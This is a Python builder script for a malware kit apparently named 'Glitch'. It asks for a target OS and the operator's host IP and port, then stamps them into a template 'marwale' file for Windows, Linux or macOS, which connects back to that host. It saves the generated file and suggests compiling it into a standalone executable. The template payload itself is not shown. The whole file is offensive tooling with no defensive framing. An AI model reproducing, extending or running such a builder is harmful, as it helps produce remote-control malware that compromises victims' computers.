#!/usr/bin/env python
import os
import re
import signal
import time
from tempfile import mkstemp
from shutil import move, copymode
from os import fdopen, remove

def Shutdownhandler(signum, frame):
    exit()


    # Set the signal handler
signal.signal(signal.SIGINT, Shutdownhandler)

main_path_temp = os.path.abspath(__file__)
creator_path = os.path.split(main_path_temp)[0]+"/Creator/"


print("\n\033[32mChoose the target OS.\033[0m\n")

print("[1] Android")
print("[2] Windows")
print("[3] Linux")
print("[4] MacOS")
print("[5] iOS\n")

target_os = input('[?] Select>: ')

print("\n\033[32mEnter your host IP.\033[0m\n")
host = input("[?] Host>: ")

port = ''

def getPort():
    print("\n\033[32mEnter your host PORT.\033[0m\n")
    global port
    port = input("[?] Port>: ")

getPort()

if not re.match(r'^([\s\d]+)$', port):
    print("\033[31mInvalid Port number.\033[0m")
    getPort()

glitch_path = os.environ['HOME'] + "/Glitch"

if not os.path.isdir(glitch_path):
    os.mkdir(glitch_path)
marwale_path = glitch_path + "/Marwales/"
if not os.path.isdir(marwale_path):
    os.mkdir(marwale_path)

print("\n\033[33m")

if host and port and target_os:
    time_date = time.strftime("%Y-%m-%d_%H-%M-%S")
    if target_os == "1":
        # Android
        print("Sorry, Android is not supported in this version.")
    elif target_os == "2":
        # Windows
        print("Setting up things.")
        print("Geting the 'marwale_path'.")
        winDir_path = marwale_path + "Windows"
        if not os.path.isdir(winDir_path):
            print("Creates a directory.")
            os.mkdir(winDir_path)
        print("Creates the marwale file.")
        print("Open the marwale file.")
        with open(winDir_path + "/marwale-" + time_date + ".py", "w") as new_file:
            with open(creator_path + "Windows/marwale.py") as old_file:
                print("Copying the marwale code.")
                print("Changing the host and port to " + host+":" + port)
                for line in old_file:
                    new_file.write(line.replace(
                        "HERE_IS_YOUR_HOST_AND_PORT", "self.serverHost , self.serverPort = " + '"' + host + '" , ' + port))
            old_file.close()
        print("Saveing the marwale.")
        new_file.close()
    elif target_os == "3":
        # Linux
        print("Setting up things.")
        print("Geting the 'marwale_path'.")
        linux_path = marwale_path + "Linux"
        if not os.path.isdir(linux_path):
            print("Creates a directory.")
            os.mkdir(linux_path)
        print("Creates the marwale file.")
        print("Open the marwale file.")
        with open(linux_path + "/marwale-" + time_date + ".py", "w") as new_file:
            with open(creator_path + "Linux/marwale.py") as old_file:
                print("Copying the marwale code.")
                print("Changing the host and port to " + host+":"+ port)
                for line in old_file:
                    new_file.write(line.replace(
                        "HERE_IS_YOUR_HOST_AND_PORT", "self.serverHost , self.serverPort = " + '"' + host + '" , ' + port))
            old_file.close()
        print("Saveing the marwale.")
        new_file.close()
    elif target_os == "4":
        # MacOS
        print("Setting up things.")
        print("Geting the 'marwale_path'.")
        macos_path = marwale_path + "macOS"
        if not os.path.isdir(macos_path):
            print("Creates a directory.")
            os.mkdir(macos_path)
        print("Creates the marwale file.")
        print("Open the marwale file.")
        with open(macos_path + "/marwale-" + time_date + ".py", "w") as new_file:
            with open(creator_path + "macOS/marwale.py") as old_file:
                print("Copying the marwale code.")
                print("Changing the host and port to " + host+":"+ port)
                for line in old_file:
                    new_file.write(line.replace(
                        "HERE_IS_YOUR_HOST_AND_PORT", "self.serverHost , self.serverPort = " + '"' + host + '" , ' + port))
            old_file.close()
        print("Saveing the marwale.")
        new_file.close()
    elif target_os == "5":
        # iOS
        print("Sorry, iOS is not supported in this version.")

    print("\033[32m\nMarwale saved successfully.\033[0m\n")
    print("The saved marwale is not compiled so if you want a standalone binary executable, compile it.\n")
else:
    print("\033[31mMissing arguments.\033[0m")
